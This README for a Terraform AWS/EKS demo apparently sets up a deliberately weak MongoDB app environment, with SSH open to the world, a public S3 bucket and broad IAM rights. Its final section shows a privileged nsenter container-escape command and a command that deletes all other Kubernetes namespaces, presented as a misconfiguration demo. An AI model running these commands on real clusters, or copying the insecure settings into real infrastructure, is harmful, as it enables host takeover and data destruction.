# aws-tasky
This repo will build all required AWS Networking and resources to run a 3 tiered MongoDB app.  This includes EC2, EKS, S3, Route53, and AWS Config.

## Pre Reqs
- Setup shell with AWS credentials
- AWS Key Pair
- Terraform 1.3.7+
- aws cli
- kubectl
- helm
- curl
- jq

## Getting Started
```
cd quickstart/infra
```
Update the `my.auto.tfvars` for your environment.  Configure your existing AWS Key Pair or copy a local SSH key to your region using this script `./scripts/push-aws-sshkey-multiregion.sh`. Review the prefix being used for resource names, the EKS version, private zone name for route53, and external  CIDR for SSH access. 

### Provision Infrastructure
Use terraform to build the required AWS Infrastructure
```
terraform init
terraform apply -auto-approve
```
All AWS resources have been provisioned and configured to support the tasky application.

### Resource Overview
While the infrastructure is being provisioned review the resources.

#### VPC
* [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/locals-usw2.tf#L17)
* [terraform-aws-modules/vpc/aws](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf)
#### EC2
* [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L54)
* [IAM Profile](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_iam_profile/iam-profile.tf)
    * Actions: "ec2:*","s3:GetObject","s3:PutObject","s3:PutObjectAcl","s3:DeleteObject","s3:ListBucket"
#### Security Groups
  * [EC2](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/main.tf#L30)
    * Ingress: Allow "0.0.0.0/0" -> TCP 22
    * Egress:  Allow "0.0.0.0/0: -> Any Protocol, Any Port
  * [MongoDB](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_sg_mongod/main.tf#L12)
    * Ingress: Allow "10.15.0.0/20" -> TCP 27017
#### Route53
* [mongoDB record](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L82)

#### S3
* [Public bucket](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L115)

#### MongoDB
* [DB build script](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/templates/mongo.sh)
Its recommended to shift left to the Infrastructure pipeline and use Packer to build the mongodb image.  Leverage your standard secrets mgmt solution to configure DB access to avoid leaking sensitive data in the process.  This image was created using Terraform's user_data to keep everything simple and using a single tool.

#### EKS Cluster 1.29
* [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L129)
* [terraform-aws-modules/eks/aws](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_alb/main.tf#L9)

#### AWS Loadbalancer controller
* [AWS LB controller](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_alb/aws_alb_controller.tf) 
This was installed as a best pratice to support internal NLB or ALBs to EKS services.  The required pulic subnet tags were added as part of the VPC creation to enable the ALB to discover EKS services in the private subnets.

### Connect to EKS clusters
Connect to EKS using `scripts/kubectl_connect_eks.sh`.  Pass this script the path to the terraform state file used to provision the EKS cluster.  If cwd is ./infra like above then this command would look like the following:
```
source ../../scripts/kubectl_connect_eks.sh .
```
This script connects EKS and builds some useful aliases shown in the output.

### Get Ingress URL
```
make getIngress

Tasky URL - http://tasky-ingress-1379807902.us-west-2.elb.amazonaws.com
```

## Tasky Application
* Is it using a good image?
* Does it have cluster-admin privileges?

Install kubectl
```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 755 kubectl
# Describe rolebinding 
```

Escape into the Node
```
./kubectl run r00t --restart=Never -ti --rm --image tasky --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Delete other namespaces to show you have cluster-admin privileges
```
./kubectl get ns --no-headers=true | sed "/kube-*/d" | sed "/default/d" | sed "/tasky/d" | awk '{print $1;}' | xargs ./kubectl delete ns
```

List rolebindings or clusterroleBindings
```
./kubectl describe rolebinding -A
```

## Next Steps


## References
[OWASP Cheatsheets](https://cheatsheetseries.owasp.org/index.html)
[OWASP Cheatsheets Repo](https://github.com/OWASP/CheatSheetSeries)
[2023 OSS Security Report](https://go.snyk.io/state-of-open-source-security-report-2023-dwn-typ.html)
[HackTricksCloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes)